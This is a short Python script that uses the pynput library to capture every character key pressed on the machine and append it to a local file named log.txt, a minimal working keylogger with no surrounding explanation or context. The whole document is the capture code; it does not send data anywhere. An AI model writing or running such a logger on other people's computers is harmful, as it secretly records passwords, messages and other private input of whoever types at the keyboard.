from pynput.keyboard import Listener

def write_to_file(key):
    try:
        letter = key.char
        with open("log.txt",'a') as f:
             f.write(letter)
    except:
        pass

with Listener (on_press = write_to_file) as l:
    l.join()
